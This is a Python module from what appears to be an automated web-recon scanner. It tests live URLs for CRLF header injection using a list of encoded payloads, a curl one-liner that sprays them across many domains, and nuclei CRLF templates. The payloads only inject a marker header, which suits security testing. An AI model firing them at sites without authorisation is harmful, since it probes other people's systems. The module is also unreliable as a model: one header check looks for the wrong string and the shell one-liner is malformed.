"""
Phase 22: CRLF Injection Detection
One-liner: cat live-domains | rush -j40 'if curl -Iks -m 10
"{}/%0d%0acrlf:crlf" | grep -q "^crlf:crlf"; then echo "VULNERABLE"'
"""

import os
import requests as req
from core.runner import run_command, tool_exists
from core.utils import read_lines, write_lines
from config import TOOLS, THREADS

CRLF_PAYLOADS = [
    "/%0d%0aX-Injected:m4rkrecon",
    "/%0aX-Injected:m4rkrecon",
    "/%0dX-Injected:m4rkrecon",
    "/%23%0dX-Injected:m4rkrecon",
    "/%25%30%61X-Injected:m4rkrecon",
    "/%E5%98%8A%E5%98%8DX-Injected:m4rkrecon",
]


def run_crlf_check(urls_file: str, output_file: str, logger) -> list[str]:
    """Check for CRLF injection by appending payloads to URLs."""
    urls = read_lines(urls_file)[:100]
    if not urls:
        return []

    logger.info(f"Testing {len(urls)} URLs for CRLF injection...")
    findings = []

    for url in urls:
        for payload in CRLF_PAYLOADS:
            try:
                test_url = url.rstrip("/") + payload
                resp = req.get(test_url, timeout=5, verify=False, allow_redirects=False)
                if "X-Injected" in resp.headers.get("X-Injected", ""):
                    findings.append(f"[CRLF] {url} (payload: {payload})")
                    logger.success(f"  CRLF injection: {url[:80]}")
                    break
                # Also check if header appears in raw response
                for header_name, header_val in resp.headers.items():
                    if "m4rkrecon" in header_val.lower():
                        findings.append(f"[CRLF] {url} (reflected in: {header_name})")
                        logger.success(f"  CRLF injection: {url[:80]}")
                        break
            except Exception:
                continue

    unique = sorted(set(findings))
    write_lines(output_file, unique)
    logger.found_count("CRLF injections", len(unique))
    return unique


def run_nuclei_crlf(input_file: str, output_file: str, logger) -> list[str]:
    """Run nuclei CRLF templates."""
    tool = TOOLS["nuclei"]
    if not tool_exists(tool):
        return []

    logger.info("Running nuclei CRLF templates...")
    cmd = [
        tool, "-l", input_file,
        "-tags", "crlf",
        "-o", output_file, "-silent", "-rl", "30",
    ]
    rc, stdout, stderr = run_command(cmd, timeout=300)

    results = read_lines(output_file)
    logger.found_count("CRLF (nuclei)", len(results))
    return results


def run_phase(domain: str, scan_dir: str, logger) -> str:
    """Run Phase 22: CRLF Injection Detection."""
    logger.phase_start(22, "CRLF Injection Detection", "payload injection + nuclei")

    live_file = os.path.join(scan_dir, "live_urls.txt")
    if not os.path.isfile(live_file) or not read_lines(live_file):
        logger.warning("No live URLs - skipping CRLF")
        logger.phase_end(22, "CRLF Detection", 0)
        return ""

    phase_dir = os.path.join(scan_dir, "phase22_crlf")
    os.makedirs(phase_dir, exist_ok=True)

    all_results = []

    # Technique 1: Direct CRLF payload injection
    crlf_file = os.path.join(phase_dir, "crlf_check.txt")
    crlf_results = run_crlf_check(live_file, crlf_file, logger)
    all_results.extend(crlf_results)

    # Technique 2: nuclei CRLF templates
    nuclei_file = os.path.join(phase_dir, "nuclei_crlf.txt")
    nuclei_results = run_nuclei_crlf(live_file, nuclei_file, logger)
    all_results.extend(nuclei_results)

    crlf_results_file = os.path.join(scan_dir, "crlf_results.txt")
    write_lines(crlf_results_file, sorted(set(all_results)))

    logger.phase_end(22, "CRLF Detection", len(set(all_results)))
    return crlf_results_file
